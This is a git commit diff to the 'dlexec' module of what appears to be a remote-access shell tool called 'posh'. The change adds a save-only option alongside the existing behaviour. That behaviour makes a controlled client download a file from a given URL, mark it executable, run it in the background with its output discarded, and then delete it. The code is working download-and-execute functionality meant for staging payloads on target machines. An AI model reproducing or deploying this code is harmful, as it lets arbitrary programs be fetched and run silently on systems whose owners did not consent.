889004fa0ffeead4f41ba649bcf5fb1e7f45d235
Mark Mossberg <mark.mossberg@gmail.com>
2015-07-25 23:32:41 -0400

    Add simple downloading to dlexec
    Flag to suppress execution, useful for simply download files from a web
    server to the target if wget/curl aren't available

--- common/modules/dlexec.py
+++ common/modules/dlexec.py
@@ -9,19 +9,21 @@ import subprocess as sp
 
 MODNAME = 'dlexec'
 USAGE = """Download and execute.
-usage: dlexec [-h] http://my.pro/gram
+usage: dlexec [-h] [-s /path/to/save/to.txt] http://my.pro/gram
 
 Download executable from internet and execute.
 
 options:
--h\t\tshow help"""
+-s, --save\tdon't execute, just save file to location
+-h\t\t\tshow help"""
 
 
 @module.server_handler(MODNAME)
 def server(server, argv):
-    if len(argv) < 2 or argv[1] in ('-h', '--help'):
+    if len(argv) < 2 or '-h' in argv or '--help' in argv:
         print USAGE
         return
+
     resp = server.conn.exchange(' '.join(argv))
     msg = 'successful' if resp == 'done' else 'error: ' + resp
     print 'posh : dlexec {}'.format(msg)
@@ -32,20 +34,34 @@ def client(client, inp):
     """Download file from internet, save to temp file, execute.
     """
 
-    r = urllib2.urlopen(inp.split()[1])
-    with tempfile.NamedTemporaryFile(delete=False) as f:
-        f.write(r.read())
-        f.flush()
-        os.fchmod(f.fileno(), stat.S_IRWXU)
+    inpv = inp.split()
+    save = inpv[1] in ('-s', '--save')
+    url = inpv[3] if save else inpv[1]
+
+    r = urllib2.urlopen(url)
+    if save:
+        with open(inpv[2], 'w') as f:
+            f.write(r.read())
+        client.s.send('done')
+        return
+    else:
+        with tempfile.NamedTemporaryFile(delete=False) as f:
+            f.write(r.read())
+            # f.flush()
+            if not save:
+                os.fchmod(f.fileno(), stat.S_IRWXU)
+
 
     # intentionally not using sp.call() here because we don't
     # necessarily want to wait() on the process. also, this is outside
     # the with block to avoid a `Text file busy' error (linux)
     try:
         sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
-    except Exception as e:
-        finish(client, f.name, str(e.args))
-        return
+    except Exception:
+        # if there was an error executing, clean up, then let the Exception
+        # bubble up where the error will get sent to server
+        os.remove(f.name)
+        raise
 
     # we need this sleep(1) because of a race condition between the
     # Popen and following remove. If there were no sleep, in the Popen,
@@ -63,9 +79,5 @@ def client(client, inp):
     # those paths after you know they're executed
     time.sleep(1)
 
-    finish(client, f.name, 'done')
-
-
-def finish(client, fname, send):
-    os.remove(fname)
-    client.s.send(send)
+    os.remove(f.name)
+    client.s.send('done')
